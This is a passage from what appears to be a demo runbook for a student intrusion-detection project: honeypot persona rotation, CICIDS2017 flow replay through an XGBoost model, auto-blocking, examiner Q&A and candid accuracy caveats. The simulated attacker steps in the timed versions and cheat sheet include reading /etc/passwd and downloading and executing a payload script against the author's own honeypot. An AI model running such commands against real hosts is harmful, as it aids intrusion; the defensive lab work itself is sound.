   ssh -p 2222 root@<WSL_IP> 'hostname; head -1 /etc/os-release; ls /home'
   ```
   Expected [RUN on the isolated copy]: `centos-web-gateway`, `PRETTY_NAME="CentOS Linux 7 (Core)"`, `centos`. (Whether a WSL source address passes the blocker is reasoned from the code, not run with demo mode on. If it is refused, show the banner and hostname lines from step 2 instead.)

4. **Back on the dashboard, click Refresh.** Expected [RUN]: `Serving persona: centos_7 (from setting)`, a **new** decision `Switch centos_7 → ubuntu_22`, and the scored-session count up by one. New sessions are now credited to `centos_7`.

*Say (limitations, unprompted):* "Three things I won't overclaim:
- The persona choice is mostly the synthetic warm start: in practice it alternates between Ubuntu and CentOS.
- We have not shown that switching keeps real attackers engaged longer. The Deception Arena compares the two only on simulated attackers.
- I triggered this round by hand so you can watch it. A supervised service can run it on a schedule, and that is verified on a separate copy, but it is not switched on in this demo environment."

*If it defers* (`Not switching to centos_7: 1 attacker session(s) open`): wait ten seconds for A3's session to close and rerun. Use `--force` only if you accept dropping that session.

### Transition A → B
*Say:* "Deception catches attackers who log in and interact. Plenty of hostile traffic never logs in, though: floods and port scans only show up as flow statistics. For that we use a flow classifier. I can't produce a real flood on a laptop, so I'll replay labelled flows from the public CICIDS2017 dataset. One seam to be upfront about: these replayed flows come from 2017 capture addresses, which I re-map to reserved test addresses. They are not the attacker you just watched."

### B. Demo B — AI Threat Detection (CICIDS2017 replay through the ML engine)

**B1. Presentation run** (Terminal 8, in `ai-engine`):
```bash
.venv\Scripts\python.exe demo\replay_cicids.py --rows 10 --delay 1.5 --api-url http://127.0.0.1:8000
```
(Use `127.0.0.1`, not `localhost`: `localhost` added about 2 s per request on this machine [RUN].)
Real output [RUN] (excerpt; ran with `--delay 0`):
```
Flow #01 | Client IP: 192.168.10.101 | Source: Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv
  +-- Model Prediction:      BENIGN               Threat: [----------] 0.0001 | ALLOW
  +-- Post-Hoc Ground Truth: BENIGN               (Revealed post-prediction)
  +-- Verdict:               [MATCH]  | Model: xgb_cicids_v1 | Latency: 1302.5ms
Flow #02 | ...
  +-- Model Prediction:      DDoS                 Threat: [##########] 1.0000 | BLOCK
  +-- Post-Hoc Ground Truth: DDoS                 (Revealed post-prediction)
  +-- Verdict:               [MATCH]  | Model: xgb_cicids_v1 | Latency: 17.1ms
...
  * Total Network Flows Tested:     10
  * Correct Model Predictions:      10
  * Sample Demonstration Accuracy:  100.00%
```
(The first flow's 1302 ms includes warm-up. Later flows took 11–50 ms.)
Background: `load_curated_sample` → strip label → `EngineTarget.analyze` → `/predict/eval` → `_score` → `extract_features_from_record` (53 features) → XGB `predict_proba` + IF `score_samples` → `_assemble` (hybrid score, action). Nothing is stored.
*Say:* "Each line is a real flow record from CICIDS2017: 50 statistics such as packet counts, inter-arrival times and flag counts. The label column is removed before sending; the script asserts that. We reveal it only after the model answers. The served model is XGBoost, plus an Isolation Forest for anomaly signal. Ten out of ten here, but ten rows prove nothing, so let me show a larger run."
*Pause and point:* "Post-Hoc Ground Truth" and `Model: xgb_cicids_v1`.

**B2. Stored + dashboard run** (shows the pipeline into MongoDB and Socket.IO):
```powershell
$env:SENTINEL_DEMO_PASSWORD = "<analyst or admin password>"
.venv\Scripts\python.exe demo\replay_cicids.py --target backend --backend-url http://172.29.32.1:5000 --email <admin email> --rows 10 --delay 1.5
```
Real [RUN] (port 5055): `[NOTE] Auto-block is ENABLED…`, 10/10 MATCH, `Client IP: 198.51.100.2 … 198.51.100.11`, and the Q7 MongoDB records. Point at the dashboard live feed: `DDoS detected - score 100%`, `IP 198.51.100.x blocked` [RUN as socket frames].

**B3. Unpaced honesty run** (have the output open, or run it if time allows):
```bash
.venv\Scripts\python.exe demo\replay_cicids.py --file datasets\cicids2017\Friday-WorkingHours-Afternoon-PortScan.pcap_ISCX.csv --rows 200 --delay 0 --api-url http://127.0.0.1:8000
```
Real [RUN]:
```
DDoS file:      Total 200 | Correct 198 | Misclassified 2 | Accuracy 99.00%
  Flow #185  BENIGN -> Malware Beacon  0.9985 BLOCK      (a false positive at block level)
  Flow #193  BENIGN -> Unknown         0.5500 ALLOW
  actions: DDoS 100/100 BLOCK; BENIGN 99 ALLOW, 1 BLOCK
PortScan file:  Total 200 | Correct 196 | Misclassified 4 | Accuracy 98.00%
  Flow #02   Port Scan -> XSS Attempt  0.6339 ALLOW      (a missed scan)
  Flow #63, #65, #91  BENIGN -> Unknown 0.5500 ALLOW
  actions: Port Scan 99 BLOCK, 1 ALLOW; BENIGN 100 ALLOW
```
*Say:* "On 200 rows per file it's 99% and 98%, with real mistakes: one benign flow was blocked as a botnet beacon, and one scan slipped through. 'Unknown' means the classifier said benign but the Isolation Forest thought it unusual. That tier never blocks."

### Transition B → C
*Say:* "Detection is only half of it. Now the response. Auto-blocking is off by default, because a false positive like flow 185 would block a legitimate host. I've switched it on for this demo. Remember the attacker from part A: their session crossed the 0.92 line, so let's see what happened to them. This is where the two halves meet: the block that matters is the honeypot attacker's, not the replayed 2017 addresses."

### C. Demo C — Autonomous Incident Response

**C1. Show the block decision.** Threats tab, then Containment/Blocked IPs.
Real [RUN]:
```
threatlogs:  sourceIP '172.29.32.1', attackType 'RCE Attempt', severity 'CRITICAL', aiScore 0.98,
             status 'BLOCKED', autonomousAction { taken: true, actionType: 'IP_BLOCKED' }
blockedips:  ip '172.29.32.1', reason 'AI Classifier auto-block (score = 0.98)'
containmentactions: target '172.29.32.1', policyDecision 'ALLOWED', enforcementBackend 'mock', enforcementStatus 'ACTIVE'
```
Background: `honeypotService.analyseClosure` (`score >= blockThreshold && autoBlockEnabled`, approve-mode and hourly cap) → `containmentService.executeAutoBlock` → `containmentPolicyService.evaluatePolicy` (protected ranges, duration) → `MockContainmentAdapter` → `BlockedIP` → `emitIPBlocked`.
*Say:* "The decision went through a policy check: you can't block loopback, link-local or your own protected ranges. It's recorded as a containment action with a one-hour expiry and an audit trail. The host firewall adapter is deliberately a simulation here. I don't change Windows Firewall rules on a demo laptop."

**C2. Reconnect is dropped.**
```bash
ssh -p 2222 root@172.29.32.17
```
Real output [RUN] (foreground Cowrie):
```
12:56:20 raw TCP connect: handshake completed
12:56:20 server sent: b'<nothing: connection closed by server (EOF)>'
12:56:20 ssh reconnect -> SSHException: Error reading SSH protocol banner
```
Cowrie terminal [RUN]:
```
[cowrie.ssh.factory.CowrieSSHFactory] [SentinelAI] Connection from blocked IP 172.29.32.1 rejected (SSH).
```
The OpenSSH client message will probably read like `kex_exchange_identification: Connection closed by remote host` (**NOT RUN**: the exact text is unverified).
Background: `sentinelblocker.py` background thread → `GET /api/honeypot/ingest/check-block` every 2 s → `{"blockedIPs":["172.29.32.1"]}` [RUN] → patched `buildProtocol` returns `None` → Twisted closes the accepted socket.
*Pause and point:* the `rejected (SSH)` line in Terminal 5.
*Say:* "The honeypot pulls SentinelAI's deny-list every two seconds. The TCP connection is accepted and then closed immediately, before the SSH banner, so the attacker can't even try a password. This enforcement happens at the honeypot, for the honeypot's port. It isn't a network firewall."

### Likely examiner questions

| Question | Safe answer | Follow-up | Answer |
|---|---|---|---|
| "Is this a live attack?" | "It's a live session against my own honeypot, run by me, on a lab network. It isn't an external attacker." | "Why trust the results then?" | "The pipeline is the same either way: Cowrie logs, parser, backend, rules. Only who typed the commands differs." |
| "Is the honeypot classification ML?" | "No. Rules over login outcome, programs run and IOC count. Cowrie gives no packet flows, so the flow model doesn't apply." | "Why not train one?" | "There's no labelled session data yet. Exporting rule-labelled sessions as weak labels is future work." |
| "Why did wget fail?" | "Cowrie has no outbound DNS or egress, by design. The download intent is logged; nothing was fetched." | "So is malware capture tested?" | "No. Download capture code exists, but it hasn't been exercised with a real download." |
| "Why XGBoost when the paper says Random Forest?" | "Under chronological evaluation XGBoost alerted on about 91% of attack flows versus the RF's 78.6%, at a similar benign rate. The RF stays as the reference." | "Same split for both?" | "Yes: de-duplicated data, the same validation-chosen 0.90 line (`experiments/pipeline/xgb_cicids_v1/summary.md`, `docs/PAPER_CORRECTIONS.md`)." |
| "Were these flows in training?" | "Of the 10, one was a training row, one a test row, and eight were never drawn. Same capture day, though, so this is a demonstration, not an independent test." | "Then what's your real generalisation?" | "Leave-one-day-out drops to 0.2–80% detection depending on the day. It doesn't detect unseen attack types reliably." |
| "Is that a real firewall block?" | "No. The firewall adapter is a mock. The real enforcement is the honeypot refusing the connection." | "Could it block for real?" | "There's a gated netsh adapter, but it's never been run live. It needs admin rights and an explicit opt-in." |
| "What stops you blocking a legitimate user?" | "Auto-block is off by default, blocks expire after an hour, there's a policy check and protected ranges, and an approval mode plus an hourly cap for honeypot blocks." | "Flow 185?" | "Exactly why it's off by default. That benign flow scored 0.9985." |
| "What does the Q-learner do?" | "It scores how engaging each session was and recommends the next persona. It doesn't change Cowrie by itself." | "Who applies it?" | "The rotator you just saw. It rewrites the config and restarts Cowrie, and records 'applied' only after proving the restart and seeing the new banner." |
| "Is it fully autonomous?" | "The application step can be: there's a supervised, disabled-by-default service, verified end to end on a separate copy. Here I triggered it by hand." | "Why not on?" | "Each switch restarts the honeypot and drops sessions, so I keep it opt-in. Also, WSL stops when no window is open, so it would pause then." |
| "Does it actually learn?" | "Yes, each real session updates the Q-table, and the panel shows how many. But 12,087 of its episodes are a synthetic warm start, and that still decides most picks." | "Is UCB better?" | "In simulation, UCB1 found the best persona in 18 of 20 runs. It also switches far more often. That's not shown on real attackers, so it isn't deployed." |
| "Do CentOS and Amazon Linux look the same?" | "They share an SSH banner, OpenSSH 7.4, which is realistic. Hostname, kernel, files and login user differ." | "Then how do you verify a switch between them?" | "By the restart proof plus the generated config, not by the banner." |

---

## PART 4: Leakage defense

**(a) Label-column leakage.**
- *10 s:* "The label is stripped before the request, and the script asserts that it's absent."
- *30 s:* "`run_replay` copies only the 50 mapped feature columns (`HEADER_TO_RECORD_FIELD`), then asserts no `label`, `Label`, `target_class` or `ground_truth` key exists before posting. The ground truth is printed only after the response comes back."
- *Technical:* `load_curated_sample` reads the label only to *choose* rows; the payload is built from `raw_features`; then `assert "label" not in payload and "Label" not in payload`. The engine's `Record` model has no label field. Caveat: the banner `[VERIFIED] Zero Ground-Truth Label Leakage` covers the label column only, not feature or sample overlap.

**(b) Feature leakage.**
- Time of day: present in the vector, but zero in all training rows. Zero variance and zero importance, so predictions are identical across all 24 hours [RUN]. Serve-time timestamps can't influence the verdict. It's dead weight that should be dropped, not a leak.
- Duplicates: the served model was trained after exact-duplicate removal (23,481 rows). 15 test rows (0.1%, all Port Scan) still match training rows. The 98.43% figure predates de-duplication and should not be quoted.
- Split: random row-level 80/20. Flows from the same attack burst land on both sides, so 98.97% is optimistic. Chronological: macro F1 0.772, about 91% attack detection at the alert line. Leave-one-day-out: Tuesday 0.2%, Wednesday 6.9%, Thursday 80.2%, Friday 10.3% detection (`experiments/pipeline/xgb_cicids_v1/summary.md`).
- *Honest line:* "There's no label leakage, and time of day is provably inert. The real weakness is that a random split within the same capture days flatters the model. Under leave-one-day-out it largely fails."

**(c) Selection bias.** "The demo sample isn't random. It's the first benign rows and the first rows of sustained attack bursts in one Friday capture, with no seed and no confidence filter. Of the ten demo flows, eight were never in training or test, one was a training row and one a test row. The 200-row runs (99%, 98%) are a sanity check on the same day's traffic, not an accuracy claim."

---

## PART 5: "What is your model's accuracy?"

| Measure | Value | Status |
|---|---|---|
| Old RF v2 (paper) | 98.43% acc, 0.9862 weighted F1, 0.8448 macro F1 | **Pre-dedup, random split. Don't quote.** |
| Served XGB, de-dup random 80/20 | **98.97% acc, 0.9907 weighted F1, 0.874 macro F1** | [RUN] reproduced by `evaluation/reproduce_reported_metrics.py --deduplicated` |
| Served XGB, chronological | macro F1 0.772; **≈91% of attack flows alerted at 0.90**; benign alert rate 0.13–0.16% (two runs: 0.134% threshold-validation, 0.159% pipeline) | [CODE/files] |
| Served XGB, leave-one-day-out | detection 0.2% / 6.9% / 80.2% / 10.3% (Tue/Wed/Thu/Fri) | [CODE/files] |
| Per-class (random split) [RUN] | BENIGN P 0.999 / R 0.996; SSH BF 0.998 / 1.000; DDoS 0.997 / 0.999; Port Scan 0.850 / 0.958; Malware Beacon 0.882 / 0.990; Credential Stuffing 0.977 / 0.898; **XSS 0.407 / 0.792**; SQLi 1.0 / 0.5 (4 rows); RCE 2 rows; Lateral 0.833 / 0.714 (7 rows) | — |
| Random split, at operating lines [RUN] | ≥ 0.90: benign alert 0.230%, detection 95.22%. ≥ 0.92: 0.225% / 94.76% | — |
| Isolation Forest alone [RUN] | flags 5.06% of benign, 24.84% of attacks | weak signal |
| Demo, 10 flows | 10/10 | — |
| Demo, 200 unpaced | 99.0% (DDoS file), 98.0% (PortScan file) | — |

**One safe spoken answer:** "On a de-duplicated random split the served XGBoost model scores 98.97% accuracy with 0.874 macro F1. Random splits flatter flow data, though, so the number I trust more is the chronological one: it alerts on about 91% of attack flows with roughly 0.15% of benign flows alerted. On attack days it never saw, detection drops sharply, so it is not a detector of novel attacks. Today's replay results are demonstrations on one capture day, not accuracy claims."

---

## PART 6: Honesty table

| Thing I might say | Safe? | Why | Correct wording |
|---|---|---|---|
| "Live attack" | Partly | I'm the attacker, on my own lab network | "A live session against my honeypot, run by me" |
| "Real-time detection" | Partly | Socket.IO is live, but end-to-end latency is unmeasured; parser ~1 s per event | "Events appear on the dashboard within about a second" |
| "Real dataset" | Yes | CICIDS2017 CSVs, sha256 recorded in meta | "Real flow records from CICIDS2017, replayed" |
| "Real prediction" | Yes | The served model, sha256-verified, golden check passed | "The deployed model scores each replayed flow" |
| "98.43% accurate" | **No** | Pre-dedup, old RF, random split | "98.97% on a de-duplicated random split; about 91% detection chronologically" |
| "Detects zero-day attacks" | **No** | LODO detection 0.2–80% | "It detects attack types it was trained on; novel attacks are a known weakness" |
| "Autonomous blocking" | Partly | Auto-block is real but opt-in; enforcement is mock plus honeypot-only | "Opt-in automated containment, enforced at the honeypot" |
| "Firewall blocks the attacker" | **No** | Mock adapter; netsh never run | "The honeypot refuses reconnects; the firewall adapter is simulated" |
| "The AI retrains itself" | **No** | The retraining script exists, but no automatic loop ran here | "Retraining is a manual, registered pipeline step" |
| "Production model" | Partly | It's the registered, served model of a prototype | "The registered model the engine serves" |
| "Real network traffic" | **No** | No packet capture; flows are replayed | "Replayed flow records; there's no live packet capture" |
| "ML classifies honeypot sessions" | **No** | Rules | "Rule-based session classification, mapped to MITRE" |
| "The honeypot adapts automatically" | **Partly** | Learning and recommendations are automatic. Applying them is by command here; a supervised service exists but is not enabled | "The Q-learner recommends a persona; the rotator applies it with a verified restart; it can run on a schedule" |
| "Adaptive deception keeps attackers engaged longer" | **No evidence** | Only simulated comparisons (Deception Arena) | "Whether it improves engagement against real attackers has not been measured" |
| "We captured malware" | **No** | wget failed (no egress) | "Download attempts are logged; no file was fetched" |
| "Random Forest model" (for the served model) | **No** | XGBoost is served | "XGBoost, with the Random Forest kept as a reference" |

**OLD CLAIM → CURRENT REALITY → CORRECT WORDING**
- Replay docstring "Uses the live, existing production model (rf_classifier_cicids_v2.pkl)" and banner "Production Random Forest Model" → the registry serves `xgb_classifier_xgb_cicids_v1.pkl` → "the deployed XGBoost model".
- Replay summary "scores >= 0.7 raised as live threats" → the alert line is 0.90, the block line 0.92 → "scores at or above 0.90 become threats; 0.92 and above can be auto-blocked".
- `DEMO_RUNBOOK.md` minute 2: "updates the firewall rule" → MockContainmentAdapter, no rule → "records a simulated containment rule".
- `DEMO_RUNBOOK.md` "Option B mock engine" → a MOCK → never use it for the threat demo.
- `README.md` "the same [chronological] evaluation has not yet been run for the XGBoost model" → `experiments/pipeline/xgb_cicids_v1/summary.md` has it → quote the summary file.
- `COWRIE_COMPLETE_GUIDE.md` "single failed login → SSH Brute Force 0.90"; "wget → RCE ≥ 0.92" → v3 rules: Intrusion Attempt 0.75; wget alone 0.91 → "brute force needs five failures; a download alone alerts, executing it blocks".
- "Blocker refuses blocked IPs within ~2 s" → was false in daemon mode until the 2026-10-22 fix; now verified in both modes → "the honeypot refreshes the deny-list every 2 seconds" (the exact block-to-refusal latency was not measured).

---

## PART 7: Troubleshooting

| Problem | Cause | Fix | What to tell the examiner |
|---|---|---|---|
| `Specified dataset path does not exist` | Wrong `--file` or cwd | Run from `ai-engine`; use `datasets\cicids2017\…csv` | "Wrong path, one second." |
| `ModuleNotFoundError` / wrong sklearn | Ran system Python, not the venv | `.\.venv\Scripts\python.exe …` (sklearn 1.4.0 is pinned by the registry) | "Wrong interpreter." |
| `docker: command not found` | Docker isn't installed | Use the native commands in Part 2 | "The demo runs natively; the Docker stack is designed but untested." |
| AI engine down / connection refused | Not started, or crashed | Terminal 2; check `/ready` | "Restarting the inference service." |
| 2 s per flow | `localhost` resolves to IPv6 first | `--api-url http://127.0.0.1:8000` | — |
| 401 / 403 from the engine | Missing or wrong `X-API-Key` | `SENTINEL_KEY` must match `backend/.env` | "API keys are enforced; wrong key loaded." |
| 401 from the backend | 15-minute access token expired | The replay re-logs in once automatically; rerun otherwise | "Sessions expire after 15 minutes by design." |
| 422 | Payload validation (e.g. commands not objects, non-finite numbers) | Use the replay script, not hand-written JSON | "Input validation rejected a malformed request." |
| 503 / "Required models are not loaded" | Registry sha256 or golden check failed | Check the engine log; don't set `ALLOW_UNREGISTERED_MODELS` during the demo | "The engine fails closed if the model is tampered with." |
| Model hash mismatch | Model file changed vs `registry.json` | `git checkout ai-engine/models/` or re-register with `training/register_model.py` | Same as above |
| Feature mismatch / "incompleteInput" | More than 5 features defaulted | Send all 50 CICIDS fields (the replay does) | "Incomplete inputs can alert but never auto-block." |
| MISMATCH verdict | A real model error | Leave it on screen | "That's a genuine miss; here's the per-class table." |
| Backend login fails | Wrong DB (account not in it), or Origin ≠ `CLIENT_URL` | Check `MONGO_URI`; `--origin http://localhost:3000` | "Wrong environment, switching." |
| Mongo not updated | Used `--target engine` (stateless) | Use `--target backend` | "The engine target is side-effect free on purpose." |
| `/deception/score` 500, `qDeceptionScore 0` | Engine-side error on the :8000 instance (cause not verified) | Restart the engine with `Q_TABLE_PATH` set (Part 2) | "The persona scorer errored; detection is unaffected." |
| Cowrie not accepting SSH | Not running, stale `twistd.pid`, wrong IP | `cowrie status`; `rm var/run/cowrie.pid`; re-read `<WSL_IP>` | — |
| `rotate`: `Not switching … attacker session(s) open` | A3's session is still open in the backend | Wait for it to close and rerun; `--force` drops it | "It won't restart the honeypot under a live attacker." |
| `rotate`: `Keeping persona … (recommended again)` | The learner chose the current persona (rare) | Rerun after the panel shows a new decision, or move on | "It decided the current persona is best; nothing to apply." |
| `rotate`: `error: … persona not recorded`, `restored: True` | The restart failed, or Cowrie came back without the new banner | Run `bash scripts/demo/cowrie-demo-mode.sh status`; if Cowrie is down, `cowrie-demo-mode.sh on` | "The safety check caught it: the old persona was restored and the decision marked failed." |
| `rotate`: `COWRIE_PERSONA_FS … not set` / `persona filesystem … does not exist` | The persona filesystems aren't built for that persona | `ls ~/sentinelai-cowrie-test/cowrie/personas`; build with `honeypot/build_honeyfs.py` | — |
| Panel still shows the old persona after `rotate` | Page not refreshed | Click **Refresh** on the panel | — |
| Parser picks up nothing | Wrong `--log` path, saved offset at end of file, wrong key | Check the `Tailing …` line; `--from-start` with a fresh state dir; check the key | — |
| Auto-block not firing | Setting off; score < 0.92 (v3 wget-only = 0.91); approve mode; hourly cap; protected IP (127.x) | Enable the setting; run `chmod` + `./payload.sh`; attack via `<WSL_IP>`; unset `HONEYPOT_AUTOBLOCK_MODE` | "Auto-block needs a score above 0.92; this one alerted only." |
| Reconnect not dropped | Old plugin deployed (daemon thread count 1); Cowrie started without `HONEYPOT_API_KEY`/`SENTINEL_API_URL`; blocker can't reach the backend (bound to 127.0.0.1) | Copy `honeypot/cowrie/sentinelblocker.py` to `src/cowrie/output/` and restart; export both vars before `cowrie start`; backend `HOST=<WIN_IP>`; WSL `curl …/check-block` | "The honeypot polls the deny-list; let me check its connection." |
| First SSH connection dropped immediately | IP still blocked from rehearsal | Unblock before the demo | — |

Cleanup after rehearsal: `mongosh --quiet "mongodb://127.0.0.1:27017/sentinel-runbook-verify-20261022" --eval "db.dropDatabase()"` (my verification DB, currently present).

---

## PART 8: Timed versions

**3 minutes (no typing risk):**
1. (60 s) A3 only: log in, run `whoami`, `cat /etc/passwd`, `wget …`, `chmod +x payload.sh`, `./payload.sh`, `exit`. Point at the MITRE chips.
2. (60 s) B1 with `--rows 10 --delay 0.5`. Say the honest accuracy line (Part 5).
3. (60 s) C2: reconnect, point at `rejected (SSH)`, say "honeypot-level enforcement; the firewall adapter is simulated."
Skip: brute force, campaigns, the backend replay, the 200-row run.

**8 minutes:**
1. (1 m) Setup tour: the terminals, `/model/info` (`xgb_cicids_v1`, verified, golden check).
2. (1.5 m) A2 + A3.
3. (1 m) A4 campaign and the HASSH caveat.
3b. (1.5 m) A5 adaptive deception: panel → `rotate --once` → new hostname → panel refresh. To stay at 8 minutes, shorten B3.
4. (0.5 m) Transition A → B.
5. (1.5 m) B1, then B2 (backend run; point at the live feed).
6. (1 m) B3 result slide: 99% / 98% and flows #185 and #02.
7. (1 m) Transition B → C, C1 (containment record, mock), C2 (reconnect dropped).
8. (0.5 m) Close: limitations (rules not ML for sessions, mock firewall, weak novel-attack generalisation).

---

## CHEAT SHEET

**Commands in order**
```text
WSL:      hostname -I ; ip route show default                  -> <WSL_IP>, <WIN_IP>
T2:       ai-engine> $env:Q_TABLE_PATH=...; .\.venv\Scripts\python.exe -m uvicorn inference.main:app --host 127.0.0.1 --port 8000 --env-file ..\backend\.env
T3:       backend>  $env:HOST="<WIN_IP>"; node server.js
T4:       frontend> $env:SENTINEL_DEV_API_PROXY="http://<WIN_IP>:5000"; npm run dev
T5 (WSL): export HONEYPOT_API_KEY=... SENTINEL_API_URL=http://<WIN_IP>:5000/api; cowrie stop; COWRIE_STDOUT=yes cowrie start   (or plain cowrie start)
T6:       log_parser.py --live --log \\wsl.localhost\Ubuntu\...\cowrie.json   (env: HONEYPOT_API_KEY, SENTINEL_API, COWRIE_CFG)
UI:       Settings -> Auto-block ON; unblock <WIN_IP>
A:        ssh -p 2222 root@<WSL_IP>   (123456)  whoami / uname -a / cat /etc/passwd / wget ... / chmod +x payload.sh / ./payload.sh / exit
A5 (WSL): bash scripts/demo/cowrie-demo-mode.sh rotate --once      -> Switching persona ubuntu_22 -> centos_7 (≈9 s)
A5 (WSL): ssh -p 2222 root@<WSL_IP> 'hostname'                     -> centos-web-gateway   (from WSL: Windows is deny-listed by now)
B:        .venv\Scripts\python.exe demo\replay_cicids.py --rows 10 --delay 1.5 --api-url http://127.0.0.1:8000
C:        ssh -p 2222 root@<WSL_IP>   -> connection closed before banner
```

**Expected key outputs**
- Cowrie: `[SentinelAI] Non-blocking blocker plugin loaded…`, `Ready to accept SSH connections`
- Session: `RCE Attempt`, 0.99 (v3, with execution), MITRE T1033 / T1082 / T1003 / T1105
- Campaign: one `CAMP-…` per HASSH
- Replay: `Model: xgb_cicids_v1`, 10/10 MATCH
- Block: ThreatLog `BLOCKED`, ContainmentAction `enforcementBackend: 'mock'`
- Reconnect: `[SentinelAI] Connection from blocked IP <WIN_IP> rejected (SSH).`

**The 5 numbers you may quote**
1. **98.97%** accuracy / **0.874** macro F1, served XGBoost, de-duplicated random 80/20.
2. **≈91%** of attack flows alerted at the 0.90 line under chronological evaluation, with **~0.15%** benign alert rate.
3. **0.90 / 0.92**: alert and block lines.
4. **2 s**: honeypot deny-list sync interval.
5. **99% / 98%**: 200-row replays (DDoS / PortScan files), called demonstrations.

**The 5 things you must never say**
1. "98.43% accuracy", or "the Random Forest" for the served model.
2. "It detects zero-day / novel attacks."
3. "The firewall blocked the attacker."
4. "The AI classifies honeypot sessions" / "the honeypot is fully autonomous" / "adaptation keeps real attackers longer."
5. "This is real live network traffic" (for the replay).
